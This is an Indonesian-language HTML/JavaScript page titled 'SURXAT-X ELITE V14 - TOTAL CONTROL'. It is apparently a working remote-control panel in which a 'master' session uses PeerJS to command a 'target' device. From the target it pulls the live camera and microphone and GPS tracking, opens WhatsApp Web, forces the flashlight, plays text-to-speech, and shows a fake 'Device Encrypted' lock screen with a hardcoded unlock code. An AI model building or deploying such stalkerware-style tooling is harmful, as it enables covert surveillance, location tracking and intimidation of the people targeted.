<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SURXAT-X ELITE V14 - TOTAL CONTROL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background: #000; color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; }
        .glass { background: rgba(15, 15, 25, 0.9); backdrop-filter: blur(25px); border: 1px solid rgba(59, 130, 246, 0.2); }
        .sidebar { position: fixed; left: -100%; top: 0; bottom: 0; width: 300px; z-index: 1000; transition: 0.5s; background: #050508; border-right: 1px solid #1e3a8a; }
        .sidebar.active { left: 0; }
        .page { display: none; height: calc(100vh - 80px); overflow-y: auto; padding: 25px; }
        .page.active { display: block; }
        .btn-main { @apply w-full py-5 rounded-3xl font-black uppercase text-[10px] tracking-[0.2em] transition-all active:scale-95 mb-4 shadow-lg; }
        #lock-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 10000; flex-direction: column; align-items: center; justify-content: center; }
        video { border-radius: 2rem; background: #000; width: 100%; aspect-ratio: 16/9; object-cover: cover; }
    </style>
</head>
<body>

    <div id="sidebar" class="sidebar p-6 flex flex-col">
        <div class="flex flex-col items-center mb-8 border-b border-white/5 pb-6">
            <img src="ssstik.io_1773231929205.jpeg" class="w-20 h-20 rounded-[2rem] border-2 border-blue-500 shadow-2xl mb-3 object-cover">
            <h2 class="text-blue-500 font-black italic tracking-tighter">SURXAT ELITE V14</h2>
        </div>
        <nav class="flex-1 overflow-y-auto space-y-2 text-[10px] font-bold uppercase tracking-widest" id="menu-items">
            </nav>
    </div>

    <header class="h-20 flex justify-between items-center px-6 glass border-b border-blue-500/10 sticky top-0 z-50">
        <button onclick="toggleSidebar()" class="text-2xl text-blue-500"><i class="fas fa-bars-staggered"></i></button>
        <div class="flex flex-col items-center">
            <span id="page-indicator" class="text-[8px] font-black text-blue-400">COMMAND CENTER</span>
            <h1 class="font-black italic text-lg uppercase tracking-tighter">SYSTEM <span id="nav-title">IDLE</span></h1>
        </div>
        <div id="status-led" class="w-3 h-3 bg-red-600 rounded-full shadow-[0_0_15px_red]"></div>
    </header>

    <main id="container">
        <div id="page-setup" class="page active">
            <div class="max-w-md mx-auto space-y-6 pt-10 text-center">
                <div class="p-10 glass rounded-[3rem]">
                    <h3 class="text-xs font-black text-blue-500 mb-6 uppercase tracking-[0.3em]">Master Handshake ID</h3>
                    <h1 id="my-id-display" class="text-6xl font-black mb-10 tracking-widest">----</h1>
                    <button onclick="startAdmin()" class="btn-main bg-blue-600">Initial Master Session</button>
                </div>
                <div class="p-10 glass rounded-[3rem]">
                    <input id="input-key" type="text" placeholder="PASTE ADMIN KEY" class="w-full bg-black/50 p-5 rounded-2xl text-center font-bold mb-6 border border-white/10 text-xl outline-none focus:border-blue-500">
                    <button id="target-btn" onclick="startTarget()" class="btn-main bg-white text-black font-black">Authorize Target Link</button>
                </div>
            </div>
        </div>

        <div id="page-module" class="page">
            <div id="module-content" class="max-w-xl mx-auto"></div>
        </div>
    </main>

    <div id="lock-screen">
        <i class="fas fa-triangle-exclamation text-7xl text-red-600 mb-10 animate-bounce"></i>
        <div class="w-full max-w-xs px-10 text-center">
            <h2 id="l-header" class="text-2xl font-black mb-4 uppercase">Device Encrypted</h2>
            <p id="l-msg" class="text-[10px] text-gray-500 mb-10 leading-relaxed"></p>
            <input type="password" id="l-pass" placeholder="UNLOCK CODE" class="w-full bg-zinc-900 p-5 rounded-3xl text-center mb-4 outline-none border border-red-900/30">
            <button onclick="checkUnlock()" class="btn-main bg-red-800">Bypass System</button>
        </div>
    </div>

    <script>
        let peer, conn, localStream;
        const navTitle = document.getElementById('nav-title');
        const modules = {
            "Surveillance": [
                { id: "cam", name: "Live Cam Feed", icon: "fa-camera", color: "text-blue-400" },
                { id: "gps", name: "GPS Tracking", icon: "fa-location-dot", color: "text-green-400" },
                { id: "mic", name: "Ambient Mic", icon: "fa-microphone", color: "text-pink-400" },
                { id: "wa", name: "WA Pairing", icon: "fa-whatsapp", color: "text-emerald-500" }
            ],
            "Hardware": [
                { id: "flash", name: "Force Flashlight", icon: "fa-bolt", color: "text-yellow-400" },
                { id: "vibe", name: "Vibrate Loop", icon: "fa-wave-square", color: "text-orange-400" },
                { id: "tts", name: "Voice TTS", icon: "fa-comment-dots", color: "text-purple-400" }
            ],
            "System": [
                { id: "lock", name: "Lock Screen", icon: "fa-lock", color: "text-red-600" },
                { id: "info", name: "Device Info", icon: "fa-circle-info", color: "text-gray-400" }
            ]
        };

        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('active'); }

        // Generate Menu Sidebar
        const menuContainer = document.getElementById('menu-items');
        Object.keys(modules).forEach(cat => {
            menuContainer.innerHTML += `<p class="text-[7px] text-gray-600 mb-2 mt-4 px-4">${cat}</p>`;
            modules[cat].forEach(f => {
                menuContainer.innerHTML += `
                    <div onclick="showModule('${f.id}')" class="flex items-center gap-4 p-4 hover:bg-white/5 rounded-xl cursor-pointer border-b border-white/5">
                        <i class="fas ${f.icon} ${f.color} w-5"></i>
                        <span>${f.name}</span>
                    </div>`;
            });
        });

        function showModule(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page-module').classList.add('active');
            navTitle.innerText = id.toUpperCase();
            toggleSidebar();

            const content = document.getElementById('module-content');
            let html = `<div class="glass p-10 rounded-[3rem] text-center">`;
            
            if(id === 'cam') html += `<video id="v-remote" autoplay playsinline class="mb-6"></video>`;
            if(id === 'tts') html += `<input id="tts-input" type="text" placeholder="Teks Suara..." class="w-full bg-black p-5 rounded-2xl mb-4 border border-white/10">`;
            if(id === 'lock') html += `<input id="lock-text" type="text" placeholder="Pesan Kunci..." class="w-full bg-black p-5 rounded-2xl mb-4 border border-white/10">`;
            
            html += `<button onclick="fire('${id}')" class="btn-main bg-blue-600">Execute ${id}</button></div>`;
            content.innerHTML = html;
        }

        // --- CORE LOGIC ---
        function startAdmin() {
            const id = "SRX-" + Math.floor(1000 + Math.random() * 9000);
            peer = new Peer(id);
            peer.on('open', () => { 
                document.getElementById('my-id-display').innerText = id.split('-')[1];
                alert("Master ID Aktif!");
            });
            peer.on('connection', c => {
                conn = c;
                document.getElementById('status-led').className = "w-3 h-3 bg-green-500 rounded-full shadow-[0_0_15px_green] animate-pulse";
            });
            peer.on('call', call => {
                call.answer();
                call.on('stream', s => { 
                    const v = document.getElementById('v-remote');
                    if(v) v.srcObject = s;
                });
            });
        }

        async function startTarget() {
            const key = document.getElementById('input-key').value;
            // PENTING: Minta izin dulu agar hardware tidak terblokir
            try {
                localStream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                alert("Izin Hardware Disetujui. Menghubungkan...");
                
                peer = new Peer();
                peer.on('open', () => {
                    conn = peer.connect('SRX-' + key);
                    conn.on('open', () => {
                        document.getElementById('target-btn').innerText = "LINKED SUCCESS";
                        document.getElementById('target-btn').classList.replace('bg-white', 'bg-green-600');
                    });
                    
                    conn.on('data', async d => {
                        if(d.type === 'cam') {
                            peer.call('SRX-' + key, localStream);
                        }
                        if(d.type === 'flash') {
                            const track = localStream.getVideoTracks()[0];
                            await track.applyConstraints({advanced: [{torch: true}]});
                        }
                        if(d.type === 'gps') {
                            navigator.geolocation.watchPosition(p => {
                                window.open(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                            }, null, {enableHighAccuracy: true});
                        }
                        if(d.type === 'wa') window.open('https://web.whatsapp.com', '_blank');
                        if(d.type === 'lock') {
                            document.getElementById('lock-screen').style.display = 'flex';
                            document.getElementById('l-msg').innerText = d.msg;
                            window.mKey = "1234";
                        }
                        if(d.type === 'tts') {
                            let u = new SpeechSynthesisUtterance(d.text);
                            u.lang = 'id-ID';
                            speechSynthesis.speak(u);
                        }
                    });
                });
            } catch (e) {
                alert("EROR: Izin Kamera/Lokasi ditolak target!");
            }
        }

        function fire(id) {
            if(!conn) return alert("Belum Terhubung!");
            const ttsVal = document.getElementById('tts-input')?.value || "";
            const lockVal = document.getElementById('lock-text')?.value || "SYSTEM SECURED";
            conn.send({type: id, text: ttsVal, msg: lockVal});
        }

        function checkUnlock() {
            if(document.getElementById('l-pass').value === "1234") location.reload();
            else alert("AKSES DITOLAK");
        }
    </script>
</body>
</html>
